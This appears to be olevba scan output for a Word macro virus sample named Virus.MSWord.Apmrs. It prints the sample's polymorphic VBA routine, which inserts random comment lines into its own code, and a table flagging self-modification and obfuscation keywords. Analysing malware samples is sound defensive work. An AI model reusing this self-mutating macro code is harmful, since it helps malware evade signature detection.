olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apmrs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apmrs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO APMRS.bas 
in file: Virus.MSWord.Apmrs - OLE stream: 'Macros/VBA/APMRS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AdvancedPolymorphicMacroReplicationSystem()

    On Error Resume Next

    Application.ScreenUpdating = False

    Set Current = MacroContainer

    For Grow = 1 To 20
        Number = Current.VBProject.VBComponents("APMRS").CodeModule.ProcCountLines("AdvancedPolymorphicMacroReplicationSystem", vbext_pk_Proc)
        RandomLine = Int(Rnd() * Number + 1)
        RemarkLength = Int(Rnd() * 40 + 1)

            For Length = 1 To RemarkLength
                Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
            Next Length

        Current.VBProject.VBComponents("APMRS").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
        Remark = ""

    Next Grow

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

